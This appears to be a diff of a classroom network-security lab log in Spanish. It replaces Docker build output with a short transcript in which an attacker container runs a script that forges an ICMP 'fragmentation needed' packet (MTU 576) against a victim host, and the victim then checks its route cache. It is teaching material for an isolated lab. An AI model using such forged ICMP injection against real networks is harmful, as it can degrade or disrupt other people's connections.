@@ -1,113 +1,15 @@
-========== PUNTO 08 — ICMP OFF-PATH [VULNERABLE] ==========
-time="2026-06-08T12:56:44-05:00" level=warning msg="Docker Compose requires buildx plugin to be installed"
- Image p08v-victima Building 
- Image p08v-servidor Building 
- Image p08v-atacante Building 
- Image p08v-servidor Building 
- Image p08v-victima Building 
- Image p08v-atacante Building 
-Sending build context to Docker daemon  2.508kB
-Sending build context to Docker daemon  2.508kB
-Sending build context to Docker daemon  2.508kB
-Step 1/7 : FROM python:3.11-slim-bookworm
-Step 1/7 : FROM python:3.11-slim-bookworm
-Step 1/7 : FROM python:3.11-slim-bookworm
- ---> 8dca233de9f3
-Step 2/7 : RUN apt-get update && apt-get install -y --no-install-recommends     iproute2 iptables tcpdump net-tools iputils-ping dnsutils curl wget openssl     procps arping netcat-openbsd iperf3 dnsmasq     && rm -rf /var/lib/apt/lists/*
- ---> 8dca233de9f3
-Step 2/7 : RUN apt-get update && apt-get install -y --no-install-recommends     iproute2 iptables tcpdump net-tools iputils-ping dnsutils curl wget openssl     procps arping netcat-openbsd iperf3 dnsmasq     && rm -rf /var/lib/apt/lists/*
- ---> 8dca233de9f3
-Step 2/7 : RUN apt-get update && apt-get install -y --no-install-recommends     iproute2 iptables tcpdump net-tools iputils-ping dnsutils curl wget openssl     procps arping netcat-openbsd iperf3 dnsmasq     && rm -rf /var/lib/apt/lists/*
- ---> Using cache
- ---> 05ff0023ce52
-Step 3/7 : RUN pip install --no-cache-dir scapy
- ---> Using cache
- ---> 05ff0023ce52
-Step 3/7 : RUN pip install --no-cache-dir scapy
- ---> Using cache
- ---> 05ff0023ce52
-Step 3/7 : RUN pip install --no-cache-dir scapy
- ---> Using cache
- ---> e49a1ecc8b12
-Step 4/7 : WORKDIR /lab
- ---> Using cache
- ---> e49a1ecc8b12
-Step 4/7 : WORKDIR /lab
- ---> Using cache
- ---> e49a1ecc8b12
-Step 4/7 : WORKDIR /lab
- ---> Using cache
- ---> d3f854e2f9e4
-Step 5/7 : COPY scripts/ /lab/
- ---> Using cache
- ---> d3f854e2f9e4
-Step 5/7 : COPY scripts/ /lab/
- ---> Using cache
- ---> d3f854e2f9e4
-Step 5/7 : COPY scripts/ /lab/
- ---> Using cache
- ---> d858fb9f3c0e
- ---> Using cache
- ---> d858fb9f3c0e
-Step 6/7 : CMD ["sleep", "infinity"]
- ---> Using cache
- ---> d858fb9f3c0e
-Step 6/7 : CMD ["sleep", "infinity"]
-Step 6/7 : CMD ["sleep", "infinity"]
- ---> Using cache
- ---> 4fa7939f12a2
-Step 7/7 : LABEL com.docker.compose.image.builder=classic
- ---> Using cache
- ---> 4fa7939f12a2
-Step 7/7 : LABEL com.docker.compose.image.builder=classic
- ---> Using cache
- ---> 4fa7939f12a2
-Step 7/7 : LABEL com.docker.compose.image.builder=classic
- ---> Using cache
- ---> 9859a745eac8
- ---> Using cache
- ---> 9859a745eac8
- ---> Using cache
- ---> 9859a745eac8
-Successfully built 9859a745eac8
-Successfully built 9859a745eac8
-Successfully built 9859a745eac8
-Successfully tagged p08v-atacante:latest
- Image p08v-atacante Built 
- Image p08v-atacante Built 
-Successfully tagged p08v-victima:latest
- Image p08v-victima Built 
- Image p08v-victima Built 
-Successfully tagged p08v-servidor:latest
- Image p08v-servidor Built 
- Image p08v-servidor Built 
- Network p08v_labnet Creating 
- Network p08v_labnet Created 
- Container p08v-servidor-1 Creating 
- Container p08v-atacante-1 Creating 
- Container p08v-victima-1 Creating 
- Container p08v-atacante-1 Created 
- Container p08v-victima-1 Created 
- Container p08v-servidor-1 Created 
- Container p08v-victima-1 Starting 
- Container p08v-servidor-1 Starting 
- Container p08v-atacante-1 Starting 
- Container p08v-servidor-1 Started 
- Container p08v-victima-1 Started 
- Container p08v-atacante-1 Started 
+
+╔══════════════════════════════════════════════════════════════╗
+║  Taller 2 — Punto 08 — ICMP OFF-PATH                ║
+║  Modo: VULNERABLE                                            ║
+╚══════════════════════════════════════════════════════════════╝
+
+oscar@lab $ [ATACANTE 10.9.0.10]
+python3 /lab/forge_icmp_mtu.py 10.9.0.20 10.9.0.20 10.9.0.30 45678 8080 1 576
 [+] ICMP Type3/Code4 forjado hacia 10.9.0.20 (MTU=576)
     Datagrama interno: 10.9.0.20:45678 -> 10.9.0.30:8080 seq=1
- Container p08v-servidor-1 Stopping 
- Container p08v-victima-1 Stopping 
- Container p08v-atacante-1 Stopping 
- Container p08v-servidor-1 Stopped 
- Container p08v-servidor-1 Removing 
- Container p08v-atacante-1 Stopped 
- Container p08v-atacante-1 Removing 
- Container p08v-victima-1 Stopped 
- Container p08v-victima-1 Removing 
- Container p08v-atacante-1 Removed 
- Container p08v-servidor-1 Removed 
- Container p08v-victima-1 Removed 
- Network p08v_labnet Removing 
- Network p08v_labnet Removed 
+
+oscar@lab # [VÍCTIMA 10.9.0.20]
+ip route get 10.9.0.30
+10.9.0.30 dev eth0 src 10.9.0.20 uid 0 
+    cache 
